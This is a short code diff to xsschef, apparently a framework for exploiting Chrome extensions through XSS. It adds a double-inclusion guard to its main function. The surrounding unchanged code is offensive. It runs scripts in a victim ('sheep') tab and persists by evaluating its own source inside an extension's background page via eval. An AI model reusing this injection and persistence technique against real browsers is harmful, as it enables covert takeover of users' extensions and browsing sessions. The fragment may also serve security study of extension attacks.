@@ -12,6 +12,10 @@ todo:
 */
 function __xsschef() {
 
+    if (window.__xsschef_init) { // prevent double inclusion
+    	return;
+	}
+	
     // these scripts gets executed in sheepchannel tab context, they're written here only for syntax highlighting & easy editing
     // START scripts
     var sheepchannel_script = function(msg) {
@@ -275,12 +279,13 @@ function __xsschef() {
                 log('alive');
             }, 20000);
         }
+        window.__xsschef_init = true;
     }
 };
 
 if (location.protocol == 'chrome-extension:') { // evaluate only in extension code
     if (chrome.extension.getBackgroundPage()) {// try to persist in background page
-        // chrome 18 csp fix - maybe add https:// script to document.body and hope for relaxed CSP policy? 
+        // chrome 18 csp fix - maybe add https:// script to document.body and hope for relaxed CSP policy?
         chrome.extension.getBackgroundPage().eval.apply(chrome.extension.getBackgroundPage(), [__xsschef.toString()+ ";__xsschef();"]);
     } else {
         __xsschef(); // no persistence :(
